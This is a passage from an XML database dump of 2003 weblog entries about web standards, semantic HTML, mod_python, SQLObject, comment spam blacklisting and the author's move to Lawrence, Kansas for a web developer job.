		<field name="body">&lt;p&gt;If you've been wondering why the site has been so quiet for the past few days, here's the reason: I've moved to the States! To cut a long story short, I'm here in sunny Lawrence for a couple of weeks preparing for a year long industrial placement at the &lt;a href=&quot;http://www.ljworld.com/&quot;&gt;Lawrence Journal-World&lt;/a&gt;, which should start for real in October (depending on my Visa application). To call this an exciting opportunity would be an understatement. The team I'm working with have won &lt;a href=&quot;http://royal.reliaserve.com/eppy/&quot; title=&quot;Eppy Awards Winners and Finalists&quot;&gt;a ton of awards&lt;/a&gt;, and have a fearsome reputation within the industry. I'm joining &lt;a href=&quot;http://www.holovaty.com/&quot;&gt;Adrian Holovaty&lt;/a&gt; (recently &lt;a href=&quot;http://zlog.co.uk/features/interviews/adrian_holovaty/&quot;&gt;interviewed on zlog&lt;/a&gt;) as a web developer working on &lt;a href=&quot;http://www.kusports.com/&quot;&gt;KUSports&lt;/a&gt;, &lt;a href=&quot;http://www.ljworld.com/&quot;&gt;LJWorld&lt;/a&gt; and the excellent &lt;a href=&quot;http://www.lawrence.com/&quot;&gt;Lawrence.com&lt;/a&gt;. The company itself is remarkably forward thinking, especially in its approach to the web (no need to support Netscape 4) - there's a good overview of what makes the Journal World special &lt;a href=&quot;http://www.digitaljournalist.org/issue0308/ljw_intro.html&quot; title=&quot;Driving with your brights on&quot;&gt;here&lt;/a&gt;, which includes a video interview with my boss, Rob Curley.&lt;/p&gt;

&lt;p&gt;As part of my new role, I'm knee deep in PostgreSQL, Python, mod_python, Red Hat and Apache so expect plenty of blogging on those subjects over the next few days. It's all good.&lt;/p&gt;</field>
		<field name="created">2003-08-27 07:11:26</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1152</field>
		<field name="title">ML Types Explained</field>
		<field name="slug">ml</field>
		<field name="body">&lt;p&gt;From a link on the mailing list edition of comp.lang.python, &lt;a href=&quot;http://perl.plover.com/yak/typing/notes.html&quot; title=&quot;Strong Typing&quot;&gt;this talk on strong typing&lt;/a&gt; (in the form of heavily annotated slides) is an explanation of the &lt;acronym title=&quot;Meta Language&quot;&gt;ML&lt;/acronym&gt; type system and why it really doesn't suck. From the same thread, &lt;a href=&quot;http://felix.sourceforge.net/&quot;&gt;Felix&lt;/a&gt; is a new high level C++ style language with an &lt;acronym title=&quot;Meta Language&quot;&gt;ML&lt;/acronym&gt; style type system which looks like it could be worth experimenting with.&lt;/p&gt;</field>
		<field name="created">2003-08-27 07:16:35</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1153</field>
		<field name="title">Code Kata</field>
		<field name="slug">codeKata</field>
		<field name="body">&lt;p&gt;I recently read my way through &lt;a href=&quot;http://www.pragmaticprogrammer.com/&quot;&gt;The Pragmatic Programmer&lt;/a&gt; and found it easily lived up to my epectations based on reviews I've seen on the web. Dave Thomas, one of the book's authors, has an excellent weblog on which he has been posting a series of programming exercises called &lt;a href=&quot;http://pragprog.com/pragdave/Practices/Kata&quot;&gt;Kata&lt;/a&gt;. Some are programming problems while some are more related to software design, but each one provides an interesting thought exercise with no instantly obvious solution.&lt;/p&gt;</field>
		<field name="created">2003-08-27 07:17:45</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1154</field>
		<field name="title">XML textarea validation bookmarklet</field>
		<field name="slug">textareaValidation</field>
		<field name="body">&lt;p&gt;Jesse Ruderman's &lt;a href=&quot;http://www.squarefree.com/archives/000031.html&quot;&gt;Blogidate bookmarklets&lt;/a&gt; cycle through all of the textareas on the current page and submit their contents for validation. I suggested an alternative approach, and to my great delight has has followed it up with the essential &lt;a href=&quot;http://www.squarefree.com/archives/000033.html&quot;&gt;Blogidate XML well-formedness&lt;/a&gt;. One click, and each textarea on the page will be checked to see if it contains valid &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt;. If it does, the background goes green - if not, it goes red. Hopefully I'll never post another invalid entry (my &lt;a href=&quot;http://simon.incutio.com/archive/2002/11/07/javascriptXmlParser&quot; title=&quot;Javascript XML parser&quot;&gt;previous solution&lt;/a&gt; broke when I switched to &lt;code&gt;application/xml+xhtml&lt;/code&gt;).&lt;/p&gt;</field>
		<field name="created">2003-08-27 07:27:31</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1155</field>
		<field name="title">Hire Meyer</field>
		<field name="slug">containingFloats</field>
		<field name="body">&lt;p&gt;Congratulations to Eric Meyer on the launch of his new consultancy business, &lt;a href=&quot;http://www.complexspiral.com/&quot;&gt;Complex Spiral Consulting&lt;/a&gt; (named after his famous &lt;a href=&quot;http://www.meyerweb.com/eric/css/edge/complexspiral/demo.html&quot; title=&quot;complexspiral demo&quot;&gt;css/edge demo&lt;/a&gt;). The new company's tag line is &quot;Helping clients improve the bottom line through the use of Web standards&quot;, so it looks like the theme of standards advocacy is continued from his role at Netscape.   Eric has also promised a series of occasional articles/tutorials, the first of which explains some &lt;a href=&quot;http://www.complexspiral.com/publications/containing-floats/&quot; title=&quot;Containing Floats&quot;&gt;useful techniques for using floats&lt;/a&gt; as part of CSS designs.&lt;/p&gt;</field>
		<field name="created">2003-08-27 19:34:22</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1156</field>
		<field name="title">Advocating Standards</field>
		<field name="slug">advocatingStandards</field>
		<field name="body">&lt;p&gt;Ian Lloyd: &lt;a href=&quot;http://www.mezzoblue.com/cgi-bin/mt/mezzo/archives/000238.asp&quot;&gt;Designing for the future, and the training gap&lt;/a&gt;. Ian highlights the frustrations faced by all web standards advocates when trying to encourage their less web-enthused co-workers to take the leap. I've been incredibly lucky in that both Incutio and LJ-World have a remarkably forward thinking approach to web standards, but I can still identify with the spirit of Ian's article.&lt;/p&gt;

&lt;p&gt;Advocating web standards is a phenomenally difficult task, for a number of reasons:&lt;/p&gt;

&lt;ul&gt;
 &lt;li&gt;The principle message, no matter how hard you try to hide it, is &quot;you're doing it wrong&quot;. No one likes to be told that they've been doing things the wrong way, especially when they've probably been using their current techniques for the past three or four years.&lt;/li&gt;
 &lt;li&gt;Web standards come with a steep learning curve. Not for new developers - I've written before about how quickly my girlfriend picked up &quot;correct&quot; &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; and &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; starting from no previous knowledge - but for people who must un-learn several years worth of previous experience. Giving up hard learned table hacks and cross browser tricks in exchange for a new set of &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; workarounds for the current crop of browsers is a pretty tough cookie to swallow.&lt;/li&gt;
 &lt;li&gt;The existing techniques work. 95% of the sites on the current web use them, and the current web is a huge success.&lt;/li&gt;
 &lt;li&gt;Until recently, standards compliant sites were for the most part pretty ugly. Thanks to the work of some very talented, public spirited designers this preconception is &lt;a href=&quot;http://www.csszengarden.com/&quot; title=&quot;The CSS Zen Garden&quot;&gt;on its way out&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Faced with those hurdles, what can we do? Jeffrey Zeldman put it best: &lt;a href=&quot;http://www.zeldman.com/daily/0802c.html#evangeline&quot;&gt;Show, don't sell&lt;/a&gt;. Redesigning a site to use &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; can slash more than 50% off the size of the page. When I was first learning &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; I rebuilt a numver of popular sites using it, and each time the resulting page was well under half the size, with less images to boot. Structural markup (in particular properly used header tags) boosts your search engine ratings. A single global &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; file allows the design of an entire site to be tweaked by altering a single file. Accessible markup opens your site up to visitors (aka customers) who could not visit it before.&lt;/p&gt;

&lt;p&gt;People who develop with web standards are currently riding well ahead of the curve. We &lt;strong&gt;know&lt;/strong&gt; it's the right way to do things, but telling people to do it because it's &lt;em&gt;right&lt;/em&gt; won't get us anywhere. Demonstrate the benefits and the theory can sneak in by the back door.&lt;/p&gt;</field>
		<field name="created">2003-08-28 04:11:56</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1157</field>
		<field name="title">Banning Google Comments</field>
		<field name="slug">googleComments</field>
		<field name="body">&lt;p&gt;Russell Beattie has &lt;a href=&quot;http://beattie.info/notebook/1003990.html&quot; title=&quot;Googler Comments&quot;&gt;an ingenious solution&lt;/a&gt; to the problem caused by weblog un-savvy Google users turning up on old entries and posting comments on them, without properly understanding the nature of the site. He simply displays the page without a comments form if he spots Google in the user's referrer. I'd be tempted to do the same thing on this site if I didn't find the comments on my ancient &lt;a href=&quot;http://simon.incutio.com/archive/2002/12/09/badInterfaceDesignFromMicrosof&quot; title=&quot;Why MSN Messenger sucks&quot;&gt;MSN Messenger rant&lt;/a&gt; so amusing.&lt;/p&gt;</field>
		<field name="created">2003-08-28 04:37:59</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1158</field>
		<field name="title">Great liquid design example</field>
		<field name="slug">greatLiquidDesign</field>
		<field name="body">&lt;p&gt;I've started browsing the web at 1600x1200, because I have a nice big monitor and a tendency to browse with my font size set to large. At this resolution you really begin to appreciate the argument put forward by fixed-width site design advocates that liquid designs can end up plain unreadable on some setups. I could just reduce the size of my browser window, but I'm lazy. Instead I'll point out that the &lt;a href=&quot;http://www.rmh-d.com/&quot;&gt;Rocky Mountain Harley-Davidson dealership&lt;/a&gt; is a liquid site that manages to look great even at ludicrously high resolutions. It's got some very decent &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; and structural markup under the hood as well.&lt;/p&gt;
</field>
		<field name="created">2003-08-28 05:00:43</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1159</field>
		<field name="title">HTML: More structural than semantic</field>
		<field name="slug">structuralVsSemantic</field>
		<field name="body">&lt;p&gt;Semantic markup is getting &lt;a href=&quot;http://www.technorati.com/cosmos/links.html?rank=&amp;amp;url=http%3A%2F%2Fwww.kottke.org%2F03%2F08%2F030826standards_do.html&amp;amp;sub=Get+Link+Cosmos&quot; title=&quot;Technorati Link Cosmos&quot;&gt;a lot of blog coverage&lt;/a&gt; at the moment, following a &lt;a href=&quot;http://www.kottke.org/03/08/030826standards_do.html&quot; title=&quot;Standards don&amp;apos;t necessarily have anything to do with being semantically correct&quot;&gt;starter post&lt;/a&gt; by Jason Kottke. There's some great content flowing around (&lt;a href=&quot;http://www.mezzoblue.com/cgi-bin/mt/mezzo/archives/000239.asp&quot; title=&quot;Semantics and Bad Code&quot;&gt;Dave Shea&lt;/a&gt;, &lt;a href=&quot;http://www.stopdesign.com/log/2003/08/26/semantics.html&quot; title=&quot;On Standards and Semantics&quot;&gt;Doug Bowman&lt;/a&gt; and &lt;a href=&quot;http://www.itnextgen.net/pseudo/archives/web_design/semantic_markup.php&quot; title=&quot;Semantic Markup&quot;&gt;Paul Scrivens&lt;/a&gt; in particular devote whole essays to the topic) but the central point is the same: just because a page validates doesn't mean it's good &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt;; semantic markup is equally if not more important for building good pages.&lt;/p&gt;

&lt;p&gt;I'm not about to disagree, and there's not much I can add to what's already been said. Instead, I'm going to be picky about terminology. In my opinion, &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; is far more a structural language than a semantic one. The word semantic suggests &lt;em&gt;meaning&lt;/em&gt;. Sure, marking something up as a paragraph or header is more meaningful than leaving it in a semantically uninteresting div or span, but to be truely semantic the markup would need to tell us what the element actually is  - a headline, or the author of an article, or a list of navigation options for the page. That kind of information is the realm of &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt;. Semantic &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; elements add a small amount of meaning, but a great amount of structure - a fact that becomes particularly important when you start applying &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt;. Try to derive real meaning from the simple elements provided by &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; and you'll quickly run in to a brick wall.&lt;/p&gt;</field>
		<field name="created">2003-08-28 05:48:51</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1160</field>
		<field name="title">Too much accessibility</field>
		<field name="slug">overAccessible</field>
		<field name="body">&lt;p&gt;Tom Gilder is right on target with &lt;a href=&quot;http://blog.tom.me.uk/2003/08/28/overaccessible.php&quot; title=&quot;Over-Accessible?&quot;&gt;his latest rant&lt;/a&gt; about sites that add accessiblity features without thinking about their consequences. Accessibility frequently involves adding new markup but you can definitely have too much of a good thing.&lt;/p&gt;</field>
		<field name="created">2003-08-29 04:05:38</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1161</field>
		<field name="title">Learning mod_rewrite</field>
		<field name="slug">modRewrite</field>
		<field name="body">&lt;p&gt;I think I've finally cracked mod_rewrite, thanks mainly to SitePoint. Key resources:&lt;/p&gt;

&lt;ul&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.sitepointforums.com/showthread.php?threadid=87665&quot;&gt;Apache Resources Collection&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.sitepoint.com/article/910/&quot;&gt;mod_rewrite: A Beginner's Guide to URL Rewriting&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.sitepoint.com/article/1207/&quot;&gt;mod_rewrite: No More Endless Loops!&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://httpd.apache.org/docs-2.0/mod/mod_rewrite.html&quot;&gt;The official documentation&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Nothing though can beat a good set of examples, and the &lt;a href=&quot;http://httpd.apache.org/docs-2.0/misc/rewriteguide.html&quot;&gt;URL Rewriting Guide&lt;/a&gt; by the module's original author provides those in abundance.&lt;/p&gt;</field>
		<field name="created">2003-08-29 04:19:28</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1162</field>
		<field name="title">On mod_python</field>
		<field name="slug">modPython</field>
		<field name="body">&lt;p&gt;So, I'm getting stuck in to &lt;a href=&quot;http://www.modpython.org/&quot;&gt;mod_python&lt;/a&gt; in a pretty big way at the moment. I've never even used mod_perl before, so coming from &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; this is turning out to be a real eye opener.&lt;/p&gt;

&lt;p&gt;The key thing to realise about mod_python is that it gives you full control over the whole Apache request. Unlike &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt;, you're not writing scripts that just happen to use Apache as a go between - mod_python exposes a pretty big chunk of Apache's internal &lt;acronym title=&quot;Application Programming Interface&quot;&gt;API&lt;/acronym&gt;, and you are expected to hook straight in to it and start doing things. This certainly takes a while to get used to, but comes with some pretty big benefits. For one thing, your code is loaded once (well, once by each Apache process) and stays in memory. This means that global variables within your scripts persist between requests! Unfortunately, each Apache process (of which there are usually quite a few) has its own copy of the code so you can't use this persistence ability for things like sessions, but it's great for pooling database connections and keeping unchanging data such as templates in memory.&lt;/p&gt;

&lt;p&gt;You can write your own handlers for the various parts of the Apache request. So far I've only been playing with the handler that serves up content, but it's possible to do things like create a handler for the &quot;Authentication&quot; phase that authenticates users in some special way.&lt;/p&gt;

&lt;p&gt;My biggest worry at the moment concerns the relative lack of documentation for mod_python on the web - the manual is pretty good, but other than that there's precious little to get your teeth in to. Luckily the module has a reasonably high traffic mailing list which has so far answered all of the questions I've thrown at it promptly and in great detail. I hope to write more about mod_python as I become more comfortable with it. If anyone has any tips, I'd love to hear them.&lt;/p&gt;</field>
		<field name="created">2003-08-29 04:31:38</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1163</field>
		<field name="title">Fighting Filters and DDoS</field>
		<field name="slug">fightingFilters</field>
		<field name="body">&lt;p&gt;Paul Graham's essays on fighting spam are generally excellent; it was Paul who sparked the recent flurry of activity surrounding Bayesian statistical filters and inspired the creation of some of the best tools for fighting spam yet. Paul's latest suggestion, &lt;a href=&quot;http://www.paulgraham.com/ffb.html&quot;&gt;Filters that fight back&lt;/a&gt;, seems to me to miss the mark in a &lt;em&gt;big&lt;/em&gt; way. Paul suggests email servers should &quot;follow&quot; links in any email received. This would turn the tables on spam, as suddenly sending out a million spams would result in a million useless hits to the site being promoted, quickly brining it to its knees. It's a great concept, until some malicious script kiddie realises that they've been handed a tool to run massive distributed denial-of-service attacks on any domain they care to target. Not to mention that such a feature would make many legitimate mass email tools prohibitively expensive to run.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Update:&lt;/strong&gt; It turns out that this issue has already been discussed in the &lt;a href=&quot;http://www.paulgraham.com/ffbfaq.html&quot;&gt;FAQ&lt;/a&gt; attached to the essay. The suggested solution is to use a blacklist, with servers only hitting sites that are linked to from an email &lt;em&gt;and&lt;/em&gt; listed on the blacklist.&lt;/p&gt;</field>
		<field name="created">2003-09-02 00:55:15</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1164</field>
		<field name="title">SQLObject</field>
		<field name="slug">sqlObject</field>
		<field name="body">&lt;p&gt;My new favourite toy is &lt;a href=&quot;http://sqlobject.org/&quot;&gt;SQLObject&lt;/a&gt;, an object-relational mapper which makes heavy use of Python's &lt;a href=&quot;http://www.python.org/doc/current/ref/specialnames.html&quot;&gt;special method names&lt;/a&gt; to create objects which can be used to transparently access and modify data in a relational database. I tried to write something like this in &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; once before and failed miserably, but SQLObject has such an elegant design that I'm just annoyed I didn't find out about it sooner. Here's some example code, adapted from the SQLOBject site:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;from SQLObject import *
# Set up a database connection
__connection__ = PyPgSQLConnection()

# This class defines a table
class Person(SQLObject):
    firstName = StringCol(length=100)
    middleInitial = StringCol(length=1, default=None)
    lastName = StringCol(length=100)

# Now create the table (if running for the first time)
Person.createTable()

# Create a record for me
p = Person.new(firstName='Simon', lastName='Willison')

print p
# Outputs &amp;lt;Person 1 firstName='Simon' middleInitial=None lastName='Willison'&amp;gt;

# Set my middle initial (updates the database)
p.middleInitial = 'P'

# Print my full name
print p.firstName, p.middleInitial, p.lastName
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;SQLObject has plenty more tricks up its sleeve: it can create class definitions by introspecting a database table, handle one to many and many to many joins, and generate complicated SELECT statements on the fly using simple, database independant syntax. It comes with support for MySQL, Postgres and SQLite. Postgres support uses the psycopg module, but we use &lt;a href=&quot;http://pypgsql.sourceforge.net/&quot;&gt;pyPgSQL&lt;/a&gt; so I wrote a simple connection wrapper to support that module which I've &lt;a href=&quot;http://sourceforge.net/mailarchive/forum.php?thread_id=3057051&amp;amp;forum_id=30269&quot; title=&quot;SQLObject ported to pyPgSQL&quot;&gt;submitted&lt;/a&gt; to the SQLObject mailing list.&lt;/p&gt;</field>
		<field name="created">2003-09-02 01:10:48</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1165</field>
		<field name="title">Googling for fun and profit</field>
		<field name="slug">funAndProfit</field>
		<field name="body">&lt;p&gt;In the style of &lt;a href=&quot;http://diveintomark.org/archives/2002/08/16/google_makes_baby_jesus_cry&quot; title=&quot;Google makes baby Jesus cry&quot;&gt;Mark Pilgrim&lt;/a&gt;, Googling &lt;a href=&quot;http://www.google.com/search?q=%22for+fun+and+profit%22&quot;&gt;for fun and profit&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-09-02 01:34:09</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1166</field>
		<field name="title">Show less errors</field>
		<field name="slug">showLessErrors</field>
		<field name="body">&lt;p&gt;The &lt;acronym title=&quot;World Wide Web Consortium&quot;&gt;W3C&lt;/acronym&gt; Validator team are &lt;a href=&quot;http://lists.w3.org/Archives/Public/www-validator/2003Aug/0105.html&quot; title=&quot;[ANN] W3C Markup Validator 0.6.5 Beta #1 - &amp;quot;Zeldman Made Us Do It!&amp;quot; - Is Released!&quot;&gt;seeking help&lt;/a&gt; with the latest version of their validator, dubbed the &quot;Zeldman Made Us Do It!&quot; release. They want people to &lt;a href=&quot;http://validator.w3.org:8001/&quot; title=&quot;Markup Validation Service v0.6.5 [Beta #1]&quot;&gt;play with the beta&lt;/a&gt; and submit suggestions for error messages that would make more sense to the average user. They also have a new feature called &quot;fussy mode&quot; which acts a bit like a lint tool for checking code, highlighting problems that aren't necessarily illegal markup but may not be best practise techniques.&lt;/p&gt;

&lt;p&gt;It's great to see improvements to error messages being made (a classic example is the head-scratch-inducing &quot;NET-enabling start-tag requires SHORTTAG YES&quot;, which means you used &lt;code class=&quot;html&quot;&gt;&amp;lt;br /&amp;gt;&lt;/code&gt; or &lt;code class=&quot;html&quot;&gt;&amp;lt;img /&amp;gt;&lt;/code&gt; in a normal &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; document) but in my opinion the best thing the validator could possible do is &lt;em&gt;display less errors&lt;/em&gt;. Let's take &lt;a href=&quot;http://www.cnn.com/&quot;&gt;CNN.com&lt;/a&gt; as a classic example of an invalid page. Feed it &lt;a href=&quot;http://validator.w3.org:8001/check?uri=http%3A%2F%2Fwww.cnn.com%2F&amp;amp;charset=%28detect+automatically%29&amp;amp;doctype=%28detect+automatically%29&amp;amp;verbose=1&amp;amp;fussy=1&quot; title=&quot;CNN.com validation results&quot;&gt;through&lt;/a&gt; the new validator and you get a list of 206 errors that scrolls for pages and pages. The average non-standards clued up web designer is going to take one look at that list and give up on the spot: the site works in all the browsers they have tested, and fixing 206 errors is just going to be a waste of their time. I can distinctly remember thinking that exact thing the first time I tried the validator, and consequentially ignoring it for well over a year afterwards.&lt;/p&gt;

&lt;p&gt;Anyone who's managed to fix up a page using the validator before will know that errors frequently cascade: one missing tag can cause a dozen or so related errors on the page, which all vanish when the initial missing tag is re-added. Further, a lot of errors boil down to exactly the same concept. If a designer has forgotten to escape the &amp;amp;s in the &lt;acronym title=&quot;Uniform Republic of Love&quot;&gt;URL&lt;/acronym&gt;s on a page it could add a hundred or so extra errors to the validation results. &lt;em&gt;They only need to be told once&lt;/em&gt;. If the validator came back with a condensed list of 6 or 7 errors along with human explanation and a note that the error occurred X times on the page it would be far less likely to send people recoiling in horror from information overload. Such a condensed report would not need to be the only interface to the validator, although I would recommend it as the default interface simply because advanced users can work out where the &quot;verbose&quot; option is themselves; it's the newbies who need a helping hand and a condensed, easily understood report.&lt;/p&gt;

&lt;p&gt;I &lt;a href=&quot;http://lists.w3.org/Archives/Public/www-validator/2003Aug/0116.html&quot; title=&quot;Validator suggestion: show less errors!&quot;&gt;submitted this suggestion&lt;/a&gt; to the validator mailing list a few days ago, but as I haven't had any replies there I thought I'd throw it open to the blogging community to see what people think.&lt;/p&gt;</field>
		<field name="created">2003-09-02 01:54:22</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1167</field>
		<field name="title">Blacklisting Comment Spam</field>
		<field name="slug">blacklisting</field>
		<field name="body">&lt;p&gt;I'm fed up with &lt;a href=&quot;http://weblog.burningbird.net/fires/001574.htm&quot; title=&quot;Using Google against us&quot;&gt;comment spam&lt;/a&gt;. From now on, any comment I judge to be spam will be deleted, and the domains linked to from that comment will be blacklisted. Any future comments that contain links to those domains will be refused. My blacklist will be made available as a simple text file, one domain per line, at &lt;a href=&quot;http://simon.incutio.com/blacklist.txt&quot;&gt;blacklist.txt&lt;/a&gt;. You are welcome to grab a copy of that file once every 24 hours and use it as part of your own comment spam prevention system. I will manually approve all domains that are added to it to ensure only domains of a dubious nature end up blacklisted.&lt;/p&gt;

&lt;p&gt;If you start using a similar system, &lt;a href=&quot;/contact/&quot;&gt;drop me a line&lt;/a&gt; and I will start using your blacklist as well (note that I will not merge it with my own public list). If I find you have been blacklisting innocent domains I will cancel my subscription to your blacklist. In this way, I hope to build a decentralised web of trust whereby other people's recommendations help my system combat spam better.&lt;/p&gt;</field>
		<field name="created">2003-09-02 19:20:47</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1168</field>
		<field name="title">Listamatic</field>
		<field name="slug">listamatic</field>
		<field name="body">&lt;p&gt;Russ Weakley's &lt;a href=&quot;http://www.maxdesign.com.au/presentation/listamatic/&quot;&gt;Listamatic&lt;/a&gt; borrows a whole bunch of fun &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; list effects from around the web and shows how they can be applied to the same markup to produce a large range of different results.&lt;/p&gt;</field>
		<field name="created">2003-09-05 09:28:59</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1169</field>
		<field name="title">Installing PySQLite</field>
		<field name="slug">installingPySQLite</field>
		<field name="body">&lt;p&gt;Techno Weenie has a &lt;a href=&quot;http://techno-weenie.com/archives/2003/09/04/003227.php&quot; title=&quot;PySQLite loaded&quot;&gt;detailed guide&lt;/a&gt; to setting up &lt;a href=&quot;http://pysqlite.sourceforge.net/&quot;&gt;PySQLite&lt;/a&gt; on boxes you don't have root access to. &lt;a href=&quot;http://www.hwaci.com/sw/sqlite/&quot;&gt;SQLite&lt;/a&gt; looks ideal for small to medium sized applications so I can see this being really useful should I ever write something that uses it.&lt;/p&gt;</field>
		<field name="created">2003-09-05 09:32:08</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1170</field>
		<field name="title">Python Client Libraries</field>
		<field name="slug">pythonClientLibraries</field>
		<field name="body">&lt;p&gt;Three really useful looking Python modules: &lt;a href=&quot;http://wwwsearch.sourceforge.net/ClientForm/&quot;&gt;ClientForm&lt;/a&gt;, &lt;a href=&quot;http://wwwsearch.sourceforge.net/ClientTable/&quot;&gt;ClientTable&lt;/a&gt; and &lt;a href=&quot;http://wwwsearch.sourceforge.net/ClientCookie/&quot;&gt;ClientCookie&lt;/a&gt;. ClientForm looks like it provides similar functionality to the form handling part of the &lt;code class=&quot;perl&quot;&gt;WWW::Mechanize&lt;/code&gt; perl module, &lt;a href=&quot;http://simon.incutio.com/archive/2003/02/03/mechanizeTheWeb&quot; title=&quot;Mechanize the web&quot;&gt;discussed previously&lt;/a&gt;. It essentially provides a very simple interface for loading an &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; page, parsing out the form information then filling in the form and submitting it back to the server. The author recommends it for automated testing (I've always had trouble figuring out how to link unit testing in to web applications) but I'm sure it could be useful for screen scraping tools as well. ClientTable is an early beta of a powerful looking table parser, and ClientCookie sits on top of the standard urllib library and transparently persists cookies in between requests.&lt;/p&gt;</field>
		<field name="created">2003-09-05 19:43:47</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1171</field>
		<field name="title">I guess I should hand in my passport</field>
		<field name="slug">ouch</field>
		<field name="body">&lt;p&gt;An example &lt;a href=&quot;http://news.bbc.co.uk/1/hi/magazine/3077964.stm&quot;&gt;Britishness test&lt;/a&gt; based on proposals by the home office for a written test for immigrants applying for citizenship. I got 3 out of 10! (via &lt;a href=&quot;http://www.brunningonline.net/simon/blog/archives/000925.html&quot; title=&quot;This blog is 80% British&quot;&gt;Simon Brunning&lt;/a&gt;).&lt;/p&gt;</field>
		<field name="created">2003-09-05 20:55:52</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1172</field>
		<field name="title">Thunderbird 0.2</field>
		<field name="slug">thunderbird</field>
		<field name="body">&lt;p&gt;Thunderbird has to have the most deceiving version numbers of any software I've ever used. I avoided version 0.1 for ages because I incorrectly assumed that a 0.1 release shouldn't be trusted with my email. I've just upgraded from 0.1 to &lt;a href=&quot;http://www.mozilla.org/projects/thunderbird/release-notes.html&quot; title=&quot;Mozilla Thunderbird 0.2&quot;&gt;the new 0.2&lt;/a&gt; and a good product has got even better - it's noticably faster and more responsive and they've knocked 1.5MB off the size of installer. I love the new direction the Mozilla organisation have been taking with their focus on separate applications; I wonder if we'll be seeing a spin off of &lt;a href=&quot;http://www.mozilla.org/editor/&quot;&gt;Composer&lt;/a&gt; any time soon.&lt;/p&gt;</field>
		<field name="created">2003-09-05 20:58:56</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1173</field>
		<field name="title">Short stories</field>
		<field name="slug">shortStories</field>
		<field name="body">&lt;p&gt;Cory Doctorow has a &lt;a href=&quot;http://www.craphound.com/place/&quot; title=&quot;A Place So Foreign and Eight More&quot;&gt;new book of short stories&lt;/a&gt; coming out, and has released six out of nine of them under a creative commons license following the success of &lt;a href=&quot;http://www.craphound.com/down/&quot;&gt;Down and Out in the Magic Kingdom&lt;/a&gt;. I just finished reading &lt;a href=&quot;http://craphound.com/place/000012.php&quot;&gt;Craphound&lt;/a&gt; and I thoroughly enjoyed it.&lt;/p&gt;</field>
		<field name="created">2003-09-08 20:28:27</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1174</field>
		<field name="title">Hinting</field>
		<field name="slug">hinting</field>
		<field name="body">&lt;p&gt;I've always wondered how fonts work. I now have a much better understanding of the technology involved thanks to Microsoft's excellent &lt;a href=&quot;http://www.microsoft.com/typography/&quot;&gt;Typography site&lt;/a&gt;, in particular this &lt;a href=&quot;http://www.microsoft.com/typography/hinting/hinting.htm&quot;&gt;Introduction to hinting&lt;/a&gt; from 1997 (via ).&lt;/p&gt;</field>
		<field name="created">2003-09-08 20:38:24</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1175</field>
